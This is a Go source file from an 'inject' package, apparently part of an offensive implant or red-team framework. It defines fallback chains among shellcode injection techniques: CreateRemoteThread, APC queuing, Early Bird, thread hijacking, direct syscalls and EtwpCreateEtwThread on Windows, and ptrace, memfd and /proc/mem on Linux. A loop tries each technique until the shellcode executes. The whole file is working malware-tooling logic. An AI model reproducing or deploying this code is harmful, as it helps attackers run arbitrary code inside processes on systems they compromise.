package inject

import (
	"fmt"
	"runtime"
)

// FallbackChain returns the ordered fallback chain for a given method.
func FallbackChain(method Method) []Method {
	if runtime.GOOS == "windows" {
		return windowsFallbackChain(method)
	}
	return linuxFallbackChain(method)
}

func windowsFallbackChain(preferred Method) []Method {
	switch preferred {
	case MethodCreateRemoteThread:
		return []Method{MethodCreateRemoteThread, MethodQueueUserAPC, MethodRtlCreateUserThread}
	case MethodCreateThread:
		return []Method{MethodCreateThread, MethodDirectSyscall, MethodCreateFiber}
	case MethodQueueUserAPC:
		return []Method{MethodQueueUserAPC, MethodCreateRemoteThread, MethodRtlCreateUserThread}
	case MethodEarlyBirdAPC:
		return []Method{MethodEarlyBirdAPC, MethodThreadHijack}
	case MethodThreadHijack:
		return []Method{MethodThreadHijack, MethodEarlyBirdAPC}
	case MethodRtlCreateUserThread:
		return []Method{MethodRtlCreateUserThread, MethodCreateRemoteThread}
	case MethodDirectSyscall:
		return []Method{MethodDirectSyscall, MethodCreateThread, MethodCreateFiber}
	case MethodCreateFiber:
		return []Method{MethodCreateFiber, MethodCreateThread, MethodDirectSyscall}
	case MethodEtwpCreateEtwThread:
		return []Method{MethodEtwpCreateEtwThread, MethodCreateThread, MethodCreateFiber}
	case MethodNtQueueApcThreadEx:
		return []Method{MethodNtQueueApcThreadEx, MethodQueueUserAPC, MethodCreateRemoteThread}
	default:
		return []Method{preferred}
	}
}

func linuxFallbackChain(preferred Method) []Method {
	switch preferred {
	case MethodPtrace:
		return []Method{MethodPtrace}
	case MethodMemFD:
		return []Method{MethodMemFD, MethodProcMem}
	case MethodProcMem:
		return []Method{MethodProcMem, MethodMemFD}
	default:
		return []Method{preferred}
	}
}

// InjectWithFallback attempts injection with automatic fallback.
func InjectWithFallback(cfg *Config, shellcode []byte) error {
	chain := FallbackChain(cfg.Method)

	var lastErr error
	for _, method := range chain {
		attemptCfg := *cfg
		attemptCfg.Method = method

		injector, err := NewInjector(&attemptCfg)
		if err != nil {
			lastErr = fmt.Errorf("method %s: %w", method, err)
			continue
		}

		err = injector.Inject(shellcode)
		if err == nil {
			return nil
		}

		lastErr = fmt.Errorf("method %s: %w", method, err)
	}

	return fmt.Errorf("all methods failed, last error: %w", lastErr)
}
